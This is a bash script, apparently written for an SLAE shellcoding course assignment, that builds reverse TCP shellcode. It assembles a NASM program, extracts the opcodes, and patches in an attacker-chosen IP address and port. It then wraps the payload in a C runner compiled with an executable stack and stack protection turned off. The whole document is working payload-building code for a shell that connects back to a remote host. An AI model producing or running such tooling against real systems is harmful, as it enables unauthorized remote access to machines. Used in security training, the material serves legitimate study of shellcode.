#!/bin/bash

# Author: Bas Lubbers
# Student ID: SLAE-1456
# Create reverse_shell
# Assignment_02 - Shell_Reverse_TCP
# Usage : ./compile_reverse_shell.sh shell_reverse_tcp 127.1.1.1 1337


port1=`printf %04X $3 |grep -o ..| tr -d '\n'`
port2=`echo \\\\\\\x${port1:0:2}\\\\\\\x${port1:2:4}`

ip1=`echo $2 | cut -d "." -f 1`
ip2=`echo $2 | cut -d "." -f 2`
ip3=`echo $2 | cut -d "." -f 3`
ip4=`echo $2 | cut -d "." -f 4`

ip1=`printf %02X $ip1`
ip2=`printf %02X $ip2`
ip3=`printf %02X $ip3`
ip4=`printf %02X $ip4`

ip=`echo \\\\\\\x$ip1\\\\\\\x$ip2\\\\\\\x$ip3\\\\\\\x$ip4`

echo "[*] Assembling $1 with Nasm"
nasm -f elf32 -o $1.o $1.nasm

echo "[*] Linking $1"
ld -o $1 $1.o

echo "[*] Swapping Port and IP in the shellcode"

shellcode=`objdump -d $1 | grep '[0-9a-f]:' | grep -v 'file' | cut -d ':' -f 2 | cut -f1-6 -d ' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/'`
shellcode_new=`echo $shellcode | sed 's/\\\\x05\\\\x39/'"$port2"'/g'`
shellcode_new2=`echo $shellcode_new | sed 's/\\\\x7f\\\\x01\\\\x01\\\\x01/'"$ip"'/g'`



echo "#include<stdio.h>" > shellcode.c
echo "#include<string.h>" >> shellcode.c
echo "unsigned char code[] = \\" >> shellcode.c
echo $shellcode_new2";" >> shellcode.c
echo "main()" >> shellcode.c
echo "{" >> shellcode.c
echo "printf(\"Shellcode Length:  %d\n\", strlen(code));" >> shellcode.c
echo "  int (*ret)() = (int(*)())code;" >> shellcode.c
echo "	ret();" >> shellcode.c
echo "}" >> shellcode.c

echo "[*] Compiling shellcode.c"

gcc -w -z execstack -fno-stack-protector shellcode.c -o shellcode

echo "[*] Execute ./shellcode to run $1, IP $2 and Port $3"
